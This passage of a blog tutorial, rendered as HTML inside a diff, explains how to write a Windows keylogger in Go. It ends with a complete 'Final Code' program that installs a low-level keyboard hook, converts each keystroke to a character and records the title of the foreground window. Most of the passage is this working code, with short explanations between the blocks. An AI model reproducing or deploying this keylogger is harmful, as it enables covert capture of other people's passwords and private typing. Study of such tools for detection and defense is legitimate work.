+			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">hwnd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">GetForegroundWindow</span>(); <span style="color:#a6e22e">hwnd</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> {
+				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">Message</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">types</span>.<span style="color:#a6e22e">WM_KEYDOWN</span> {
+					<span style="color:#a6e22e">key_out</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">VKCodeToAscii</span>(<span style="color:#a6e22e">k</span>)
+					<span style="color:#a6e22e">window_out</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">GetWindowText</span>(<span style="color:#a6e22e">HWND</span>(<span style="color:#a6e22e">hwnd</span>))
+				}
+			}
+		}
+	}
+}
+
+</code></pre></div><p>Function Run() runs the keylogger.</p>
+<h4 id="how-it-works">How it works:<a hidden class="anchor" aria-hidden="true" href="#how-it-works">#</a></h4>
+<p>First initialize a buffered channel to store keyboard events then install the low level keyboard hook using <code>keyboard.Install()</code>.<br>
+defer uninstallation of the hook so that it gets uninstalled when the function returns.
+Then in an infinite for loop get the foreground window using GetForegroundWindow() and when a key is pressed send the key to the key_out channel and the window name to window_out channel.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">VKCodeToAscii</span>(<span style="color:#a6e22e">k</span> <span style="color:#a6e22e">types</span>.<span style="color:#a6e22e">KeyboardEvent</span>) <span style="color:#66d9ef">rune</span> {
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buffer</span> []<span style="color:#66d9ef">uint16</span> = make([]<span style="color:#66d9ef">uint16</span>, <span style="color:#ae81ff">256</span>)
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">keyState</span> []<span style="color:#66d9ef">byte</span> = make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">256</span>)
+
+	<span style="color:#a6e22e">n</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">10</span>
+	<span style="color:#a6e22e">n</span> <span style="color:#f92672">|=</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>)
+
+	<span style="color:#a6e22e">procGetKeyState</span>.<span style="color:#a6e22e">Call</span>(uintptr(<span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">VKCode</span>))
+
+	<span style="color:#a6e22e">procGetKeyboardState</span>.<span style="color:#a6e22e">Call</span>(uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">keyState</span>[<span style="color:#ae81ff">0</span>])))
+	<span style="color:#a6e22e">r1</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">procGetKeyboardLayout</span>.<span style="color:#a6e22e">Call</span>(<span style="color:#ae81ff">0</span>)
+
+	<span style="color:#a6e22e">procToUnicodeEx</span>.<span style="color:#a6e22e">Call</span>(uintptr(<span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">VKCode</span>), uintptr(<span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">ScanCode</span>), uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">keyState</span>[<span style="color:#ae81ff">0</span>])),
+		uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">buffer</span>[<span style="color:#ae81ff">0</span>])), <span style="color:#ae81ff">256</span>, uintptr(<span style="color:#a6e22e">n</span>), <span style="color:#a6e22e">r1</span>)
+
+	<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">UTF16ToString</span>(<span style="color:#a6e22e">buffer</span>)) &gt; <span style="color:#ae81ff">0</span> {
+		<span style="color:#66d9ef">return</span> []rune(<span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">UTF16ToString</span>(<span style="color:#a6e22e">buffer</span>))[<span style="color:#ae81ff">0</span>]
+	}
+	<span style="color:#66d9ef">return</span> rune(<span style="color:#ae81ff">0</span>)
+}
+</code></pre></div><p>Function VKCodeToAscii converts from Virtual-Key Code to ASCII</p>
+<h5 id="how-it-works-1">How it works<a hidden class="anchor" aria-hidden="true" href="#how-it-works-1">#</a></h5>
+<p>First initialize two buffers one for storing the result and one for storing the keyboard state, Then get the key state of the pressed key because that&rsquo;s the only way the rest of the function will work <em>trust me try removing that line and it&rsquo;ll return innacurate results</em>. After that get the keyboard state and store it in the buffer we created, Then Call ToUnicodeEx to convert from VKCode to unicode. Then return the result if the length of the result buffer is larger than 0.</p>
+<h1 id="final-code">Final Code:<a hidden class="anchor" aria-hidden="true" href="#final-code">#</a></h1>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+
+<span style="color:#f92672">import</span> (
+	<span style="color:#e6db74">&#34;fmt&#34;</span>
+	<span style="color:#e6db74">&#34;os&#34;</span>
+	<span style="color:#e6db74">&#34;os/signal&#34;</span>
+
+	<span style="color:#e6db74">&#34;syscall&#34;</span>
+	<span style="color:#e6db74">&#34;unsafe&#34;</span>
+
+	<span style="color:#e6db74">&#34;github.com/moutend/go-hook/pkg/keyboard&#34;</span>
+	<span style="color:#e6db74">&#34;github.com/moutend/go-hook/pkg/types&#34;</span>
+	<span style="color:#e6db74">&#34;golang.org/x/sys/windows&#34;</span>
+)
+
+
+<span style="color:#66d9ef">var</span> (
+	<span style="color:#a6e22e">mod</span> = <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">NewLazyDLL</span>(<span style="color:#e6db74">&#34;user32.dll&#34;</span>)
+
+	<span style="color:#a6e22e">procGetKeyState</span>         = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetKeyState&#34;</span>)
+	<span style="color:#a6e22e">procGetKeyboardLayout</span>   = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetKeyboardLayout&#34;</span>)
+	<span style="color:#a6e22e">procGetKeyboardState</span>    = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetKeyboardState&#34;</span>)
+	<span style="color:#a6e22e">procGetForegroundWindow</span> = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetForegroundWindow&#34;</span>)
+	<span style="color:#a6e22e">procToUnicodeEx</span>         = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;ToUnicodeEx&#34;</span>)
+	<span style="color:#a6e22e">procGetWindowText</span>       = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetWindowTextW&#34;</span>)
+	<span style="color:#a6e22e">procGetWindowTextLength</span> = <span style="color:#a6e22e">mod</span>.<span style="color:#a6e22e">NewProc</span>(<span style="color:#e6db74">&#34;GetWindowTextLengthW&#34;</span>)
+)
+
+<span style="color:#66d9ef">type</span> (
+	<span style="color:#a6e22e">HANDLE</span> <span style="color:#66d9ef">uintptr</span>
+	<span style="color:#a6e22e">HWND</span>   <span style="color:#a6e22e">HANDLE</span>
+)
+
+<span style="color:#75715e">// Gets length of text of window text by HWND
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GetWindowTextLength</span>(<span style="color:#a6e22e">hwnd</span> <span style="color:#a6e22e">HWND</span>) <span style="color:#66d9ef">int</span> {
+	<span style="color:#a6e22e">ret</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">procGetWindowTextLength</span>.<span style="color:#a6e22e">Call</span>(
+		uintptr(<span style="color:#a6e22e">hwnd</span>))
+
+	<span style="color:#66d9ef">return</span> int(<span style="color:#a6e22e">ret</span>)
+}
+
+<span style="color:#75715e">// Gets text of window text by HWND
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GetWindowText</span>(<span style="color:#a6e22e">hwnd</span> <span style="color:#a6e22e">HWND</span>) <span style="color:#66d9ef">string</span> {
+	<span style="color:#a6e22e">textLen</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">GetWindowTextLength</span>(<span style="color:#a6e22e">hwnd</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+
+	<span style="color:#a6e22e">buf</span> <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">uint16</span>, <span style="color:#a6e22e">textLen</span>)
+	<span style="color:#a6e22e">procGetWindowText</span>.<span style="color:#a6e22e">Call</span>(
+		uintptr(<span style="color:#a6e22e">hwnd</span>),
+		uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">buf</span>[<span style="color:#ae81ff">0</span>])),
+		uintptr(<span style="color:#a6e22e">textLen</span>))
+
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">UTF16ToString</span>(<span style="color:#a6e22e">buf</span>)
+}
+
+<span style="color:#75715e">// Gets current foreground window
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GetForegroundWindow</span>() <span style="color:#66d9ef">uintptr</span> {
+	<span style="color:#a6e22e">hwnd</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">procGetForegroundWindow</span>.<span style="color:#a6e22e">Call</span>()
+	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hwnd</span>
+}
+
+<span style="color:#75715e">// Runs the keylogger
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">Run</span>(<span style="color:#a6e22e">key_out</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">rune</span>, <span style="color:#a6e22e">window_out</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">error</span> {
+	<span style="color:#a6e22e">keyboardChan</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#a6e22e">types</span>.<span style="color:#a6e22e">KeyboardEvent</span>, <span style="color:#ae81ff">1024</span>)
+
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">keyboard</span>.<span style="color:#a6e22e">Install</span>(<span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">keyboardChan</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+	}
+
+	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">keyboard</span>.<span style="color:#a6e22e">Uninstall</span>()
+
+	<span style="color:#a6e22e">signalChan</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Signal</span>, <span style="color:#ae81ff">1</span>)
+	<span style="color:#a6e22e">signal</span>.<span style="color:#a6e22e">Notify</span>(<span style="color:#a6e22e">signalChan</span>, <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Interrupt</span>)
+
+	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;start capturing keyboard input&#34;</span>)
+
+	<span style="color:#66d9ef">for</span> {
+		<span style="color:#66d9ef">select</span> {
+		<span style="color:#66d9ef">case</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">signalChan</span>:
+			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Received shutdown signal&#34;</span>)
+			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
+		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">k</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">keyboardChan</span>:
+			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">hwnd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">GetForegroundWindow</span>(); <span style="color:#a6e22e">hwnd</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> {
+				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">Message</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">types</span>.<span style="color:#a6e22e">WM_KEYDOWN</span> {
+					<span style="color:#a6e22e">key_out</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">VKCodeToAscii</span>(<span style="color:#a6e22e">k</span>)
+					<span style="color:#a6e22e">window_out</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">GetWindowText</span>(<span style="color:#a6e22e">HWND</span>(<span style="color:#a6e22e">hwnd</span>))
+				}
+			}
+		}
+	}
+}
+
+<span style="color:#75715e">// Converts from Virtual-Keycode to Ascii rune
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">VKCodeToAscii</span>(<span style="color:#a6e22e">k</span> <span style="color:#a6e22e">types</span>.<span style="color:#a6e22e">KeyboardEvent</span>) <span style="color:#66d9ef">rune</span> {
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buffer</span> []<span style="color:#66d9ef">uint16</span> = make([]<span style="color:#66d9ef">uint16</span>, <span style="color:#ae81ff">256</span>)
+	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">keyState</span> []<span style="color:#66d9ef">byte</span> = make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">256</span>)
+
+	<span style="color:#a6e22e">n</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">10</span>
+	<span style="color:#a6e22e">n</span> <span style="color:#f92672">|=</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>)
+
+	<span style="color:#a6e22e">procGetKeyState</span>.<span style="color:#a6e22e">Call</span>(uintptr(<span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">VKCode</span>))
+
+	<span style="color:#a6e22e">procGetKeyboardState</span>.<span style="color:#a6e22e">Call</span>(uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">keyState</span>[<span style="color:#ae81ff">0</span>])))
+	<span style="color:#a6e22e">r1</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">procGetKeyboardLayout</span>.<span style="color:#a6e22e">Call</span>(<span style="color:#ae81ff">0</span>)
+
+	<span style="color:#a6e22e">procToUnicodeEx</span>.<span style="color:#a6e22e">Call</span>(uintptr(<span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">VKCode</span>), uintptr(<span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">ScanCode</span>), uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">keyState</span>[<span style="color:#ae81ff">0</span>])),
+		uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">buffer</span>[<span style="color:#ae81ff">0</span>])), <span style="color:#ae81ff">256</span>, uintptr(<span style="color:#a6e22e">n</span>), <span style="color:#a6e22e">r1</span>)
+
+	<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">UTF16ToString</span>(<span style="color:#a6e22e">buffer</span>)) &gt; <span style="color:#ae81ff">0</span> {
+		<span style="color:#66d9ef">return</span> []rune(<span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">UTF16ToString</span>(<span style="color:#a6e22e">buffer</span>))[<span style="color:#ae81ff">0</span>]
+	}
+	<span style="color:#66d9ef">return</span> rune(<span style="color:#ae81ff">0</span>)
+}
+</code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://xart3mis.github.io/">The Sico blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
